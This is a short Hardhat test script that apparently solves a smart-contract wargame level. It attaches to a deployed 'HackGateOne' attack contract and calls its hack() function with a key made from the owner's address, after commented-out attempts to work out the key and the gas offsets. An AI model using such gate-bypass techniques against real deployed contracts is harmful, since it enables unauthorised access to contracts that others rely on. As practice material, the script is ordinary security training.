const { expect } = require("chai");
const { Contract } = require("ethers");
const { ethers } = require("hardhat");



describe("Unlock", function () {
  it("Unlock", async function () {
    const [owner] = await ethers.getSigners();

    const HackGateOne = await ethers.getContractFactory("HackGateOne");
    const hackgateone = await HackGateOne.attach("0x17c3c86005EB1F271B23C8162AAF8a69Ddb240E5");

    // 1940 gas spent between gate one and gate two
    // some gas spent to call external contract

    // console.log(owner.address)
    // const res16add = await hackgateone.get16add(owner.address)
    // console.log(res16add)

    // const res8add = await hackgateone.get8(owner.address.concat("000000000000000000000000"))
    // console.log(res8add)

    // const res8 = "0x000000000000D4E2"
    // const res64 = await hackgateone.get64(res8)
    // console.log(res64)

    // const res32 = await hackgateone.get32(res64)
    // console.log(res32)


    // const bytes8 = await hackgateone.get_bytes_from_64(13123234)
    // console.log(bytes8)


    // const key = ethers.utils.formatBytes32String("key");
    const key = owner.address.concat("000000000000000000000000");
    console.log(key)
    const res = await hackgateone.hack(key);
    const out = await res.wait();

    console.log(out)
    

    // const res = await hackgateone.entrant();
    // console.log(res)

  }
)});
